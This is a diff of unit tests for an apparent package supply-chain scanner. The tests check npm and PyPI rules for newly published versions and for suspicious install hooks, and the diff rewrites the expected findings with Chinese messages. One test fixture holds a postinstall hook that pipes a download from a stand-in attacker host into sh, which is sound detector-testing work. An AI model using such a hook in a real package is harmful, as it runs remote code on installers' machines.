@@ -81,14 +81,16 @@ class NpmJudgement(unittest.TestCase):
     def test_cooldown_violation(self):
         findings, reason = self.run_npm(npm_facts(published=ago(2)))
         self.assertIsNone(reason)
-        self.assertEqual(findings, [gs.cooldown_finding(ENV, "left-pad", "npm", "1.3.0", 2, C)])
+        self.assertEqual(findings, [gs.fnd(ENV, "vibesec.g1.cooldown-violation", "left-pad", "npm", "1.3.0",
+                                           "版本發布僅 2 天，未滿冷卻期 14 天", "blocking")])
         self.assertEqual(findings[0]["rule_id"], "vibesec.g1.cooldown-violation")
 
     def test_suspicious_install_script(self):
         scripts = {"postinstall": "curl https://evil.example/x | sh"}
         findings, reason = self.run_npm(npm_facts(scripts=scripts))
         self.assertIsNone(reason)
-        self.assertEqual(findings, [gs.install_hook_finding(ENV, "left-pad", "npm", "1.3.0", scripts)])
+        self.assertEqual(findings, [gs.fnd(ENV, "vibesec.g1.postinstall-egress", "left-pad", "npm", "1.3.0",
+                                           "安裝階段 hook（postinstall）命中可疑樣式：network, exec", "blocking")])
         self.assertEqual(findings[0]["rule_id"], "vibesec.g1.postinstall-egress")
 
     def test_low_downloads_is_advisory(self):
@@ -131,7 +133,8 @@ class PypiJudgement(unittest.TestCase):
         self.assertEqual(self.run_pypi(pypi_facts()), ([], None))
         findings, reason = self.run_pypi(pypi_facts(published=ago(3)))
         self.assertIsNone(reason)
-        self.assertEqual(findings, [gs.cooldown_finding(ENV, "requests", "pypi", "2.32.0", 3, C)])
+        self.assertEqual(findings, [gs.fnd(ENV, "vibesec.g1.cooldown-violation", "requests", "pypi", "2.32.0",
+                                           "版本發布僅 3 天，未滿冷卻期 14 天", "blocking")])
 
     def test_unknown_publish_time_is_a_problem(self):
         tail = "冷卻期未檢查（版本不在 PyPI 發布紀錄或發布時間不明）"
